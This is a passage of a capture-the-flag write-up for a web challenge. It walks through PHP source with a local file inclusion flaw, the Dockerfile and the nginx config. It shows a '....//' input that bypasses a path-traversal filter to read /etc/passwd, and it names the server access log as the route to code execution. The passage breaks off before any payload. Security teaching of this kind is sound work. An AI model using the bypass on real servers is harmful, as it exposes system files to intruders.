</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">26</span><span class="">            </span><span class="token tag punctuation">&lt;</span><span class="token tag">ul</span><span class="token tag"> </span><span class="token tag attr-name">class</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">sidebar-nav</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="">                </span><span class="token tag punctuation">&lt;</span><span class="token tag">li</span><span class="token tag"> </span><span class="token tag attr-name">class</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">sidebar-brand</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class="">                    </span><span class="token tag punctuation">&lt;</span><span class="token tag">a</span><span class="token tag"> </span><span class="token tag attr-name">href</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">#</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">29</span>                        Admin Dashboard (Under Construction)
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">30</span><span class="">                    </span><span class="token tag punctuation">&lt;/</span><span class="token tag">a</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class="">                </span><span class="token tag punctuation">&lt;/</span><span class="token tag">li</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">32</span><span class="">                </span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">class</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">profile-sidebar</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class="">                    </span><span class="token comment">&lt;!-- SIDEBAR USERPIC --&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="">                    </span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">class</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">profile-userpic</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class="">                        </span><span class="token tag punctuation">&lt;</span><span class="token tag">img</span><span class="token tag"> </span><span class="token tag attr-name">src</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">/static/images/makelaris.png</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag attr-name">class</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">img-responsive</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag attr-name">alt</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">36</span><span class="">                    </span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="">                    </span><span class="token comment">&lt;!-- END SIDEBAR USERPIC --&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">38</span><span class="">                    </span><span class="token comment">&lt;!-- SIDEBAR USER TITLE --&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">39</span><span class="">                    </span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">class</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">profile-usertitle</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">40</span><span class="">                        </span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">class</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">profile-usertitle-name</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">41</span><span class="">                            </span><span class="token php language-php delimiter important">&lt;?php</span><span class="token php language-php"> </span><span class="token php language-php keyword">echo</span><span class="token php language-php"> </span><span class="token php language-php variable">$username</span><span class="token php language-php"> </span><span class="token php language-php delimiter important">?&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">42</span><span class="">                        </span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">43</span><span class="">                        </span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">class</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">profile-usertitle-job</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">44</span>                            Administrator
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">45</span><span class="">                        </span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">46</span><span class="">                    </span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">47</span><span class="">                    </span><span class="token comment">&lt;!-- END SIDEBAR USER TITLE --&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">48</span><span class="">                    </span><span class="token comment">&lt;!-- SIDEBAR BUTTONS --&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">49</span><span class="">                    </span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">class</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">profile-userbuttons</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">50</span><span class="">                        </span><span class="token tag punctuation">&lt;</span><span class="token tag">a</span><span class="token tag"> </span><span class="token tag attr-name">href</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">/logout</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag attr-name">class</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">btn btn-danger btn-xs</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">Log Out</span><span class="token tag punctuation">&lt;/</span><span class="token tag">a</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">51</span><span class="">                    </span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">52</span><span class="">                </span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">53</span><span class="">            </span><span class="token tag punctuation">&lt;/</span><span class="token tag">ul</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">54</span><span class="">        </span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">55</span><span class="">        </span><span class="token comment">&lt;!-- /#sidebar-wrapper --&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">56</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">57</span><span class="">        </span><span class="token comment">&lt;!-- Page Content --&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">58</span><span class="">        </span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">id</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">page-content-wrapper</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">59</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">60</span><span class="">            </span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">class</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">container-fluid</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">61</span><span class="">                </span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">class</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">row text-right mb-4</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">62</span><span class="">	                </span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">class</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">col</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">63</span><span class="">	                    </span><span class="token tag punctuation">&lt;</span><span class="token tag">select</span><span class="token tag"> </span><span class="token tag attr-name">class</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">custom-select</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag attr-name">id</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">gotoPage</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">64</span><span class="">	                    	</span><span class="token php language-php delimiter important">&lt;?php</span><span class="token php language-php"> 
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">65</span><span class="token php language-php">	                    		</span><span class="token php language-php keyword">echo</span><span class="token php language-php"> </span><span class="token php language-php string double-quoted-string">&quot;&lt;option value=&#x27;</span><span class="token php language-php string double-quoted-string interpolation variable">$utilFile</span><span class="token php language-php string double-quoted-string">&#x27; selected=&#x27;true&#x27;&gt;</span><span class="token php language-php string double-quoted-string interpolation variable">$utilFile</span><span class="token php language-php string double-quoted-string">&lt;/option&gt;&quot;</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="token php language-php"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">66</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">67</span><span class="token php language-php">	                    		</span><span class="token php language-php variable">$pages</span><span class="token php language-php"> </span><span class="token php language-php operator">=</span><span class="token php language-php"> </span><span class="token php language-php keyword">array</span><span class="token php language-php punctuation">(</span><span class="token php language-php string double-quoted-string">&quot;logs.php&quot;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php string double-quoted-string">&quot;tickets.php&quot;</span><span class="token php language-php punctuation">,</span><span class="token php language-php"> </span><span class="token php language-php string double-quoted-string">&quot;todo.php&quot;</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">68</span><span class="token php language-php">	                    		</span><span class="token php language-php keyword">foreach</span><span class="token php language-php"> </span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$pages</span><span class="token php language-php"> </span><span class="token php language-php keyword">as</span><span class="token php language-php"> </span><span class="token php language-php variable">$page</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">69</span><span class="token php language-php">	                    			</span><span class="token php language-php keyword">if</span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$page</span><span class="token php language-php"> </span><span class="token php language-php operator">!=</span><span class="token php language-php"> </span><span class="token php language-php variable">$utilFile</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">{</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">70</span><span class="token php language-php">	                    				</span><span class="token php language-php keyword">echo</span><span class="token php language-php"> </span><span class="token php language-php string double-quoted-string">&quot;&lt;option value=&#x27;</span><span class="token php language-php string double-quoted-string interpolation variable">$page</span><span class="token php language-php string double-quoted-string">&#x27;&gt;</span><span class="token php language-php string double-quoted-string interpolation variable">$page</span><span class="token php language-php string double-quoted-string">&lt;/option&gt;&quot;</span><span class="token php language-php punctuation">;</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">71</span><span class="token php language-php">	                    			</span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">72</span><span class="token php language-php">	                    		</span><span class="token php language-php punctuation">}</span><span class="token php language-php">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">73</span><span class="token php language-php">	                    	</span><span class="token php language-php delimiter important">?&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">74</span><span class="">						</span><span class="token tag punctuation">&lt;/</span><span class="token tag">select</span><span class="token tag punctuation">&gt;</span><span class="">  
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">75</span><span class="">	                </span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="">    
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">76</span><span class="">	            </span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">77</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">78</span><span class="">                </span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">class</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">manage-box</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">79</span><span class="">                	</span><span class="token php language-php delimiter important">&lt;?php</span><span class="token php language-php"> </span><span class="token php language-php keyword">include_once</span><span class="token php language-php punctuation">(</span><span class="token php language-php variable">$fullPath</span><span class="token php language-php punctuation">)</span><span class="token php language-php punctuation">;</span><span class="token php language-php"> </span><span class="token php language-php delimiter important">?&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">80</span><span class="">                </span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">81</span><span class="">            </span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">82</span><span class="">        </span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">83</span><span class="">        </span><span class="token comment">&lt;!-- /#page-content-wrapper --&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">84</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">85</span><span class="">    </span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">86</span><span class=""></span><span class="token tag punctuation">&lt;/</span><span class="token tag">body</span><span class="token tag punctuation">&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">87</span><span class=""></span><span class="token comment">&lt;!-- ... --&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">88</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">89</span><span class=""></span><span class="token tag punctuation">&lt;/</span><span class="token tag">html</span><span class="token tag punctuation">&gt;</span></code></pre></div></div>
<p>it looks like we get local file inclusion, but with path traversal blocked by a <code class="opacity-75 bg-black/30 rounded p-1">str_replace</code>.</p>
<p>However, we can very easily get around this filter by passing a query param such as <code class="opacity-75 bg-black/30 rounded p-1">....//....//etc/passwd</code>: the script will delete every instance of <code class="opacity-75 bg-black/30 rounded p-1">../</code>, leaving us with a file inclusion of <code class="opacity-75 bg-black/30 rounded p-1">/var/www/../../etc/passwd</code>.</p>
<p>We still can&#x27;t directly include the flag, though; looking at the dockerfile, the flag file&#x27;s name is randomly generated at build time.</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (Dockerfile)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">FROM alpine:edge
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">2</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">3</span># Setup usr
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">4</span>RUN adduser -D -u 1000 -g 1000 -s /bin/sh www
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">5</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">6</span># Install system packages
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">7</span>RUN apk add --no-cache --update supervisor nginx php7-fpm php7-sqlite3 php7-json
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">8</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">9</span># Configure php-fpm and nginx
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">10</span>COPY config/fpm.conf /etc/php7/php-fpm.d/www.conf
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">11</span>COPY config/supervisord.conf /etc/supervisord.conf
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">12</span>COPY config/nginx.conf /etc/nginx/nginx.conf
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">13</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">14</span># Copy challenge files
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">15</span>COPY challenge /www
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">16</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">17</span># Copy flag
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">18</span>RUN RND=$(echo $RANDOM | md5sum | head -c 15) &amp;&amp; \
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">19</span>	echo &quot;HTB{f4k3_fl4g_f0r_t3st1ng}&quot; &gt; /flag_${RND}.txt
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">20</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">21</span># Setup permissions
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">22</span>RUN chown -R www:www /var/lib/nginx
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">23</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">24</span># Expose the port nginx is listening on
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">25</span>EXPOSE 80
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">26</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">27</span>CMD /usr/bin/supervisord -c /etc/supervisord.conf</code></pre></div></div>
<p>Then, we can try to get RCE instead. Looking at the nginx config, we can see
that the server logs requests to <code class="opacity-75 bg-black/30 rounded p-1">/var/log/nginx/access.log</code>:</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (conf)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">user www;
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">2</span>pid /run/nginx.pid;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">3</span>error_log /dev/stderr info;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">4</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">5</span>events {
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">6</span>    worker_connections 1024;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">7</span>}
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">8</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">9</span>http {
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">10</span>    server_tokens off;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">11</span>    log_format docker &#x27;$remote_addr $remote_user $status &quot;$request&quot; &quot;$http_referer&quot; &quot;$http_user_agent&quot; &#x27;;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">12</span>    access_log /var/log/nginx/access.log docker;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">13</span>
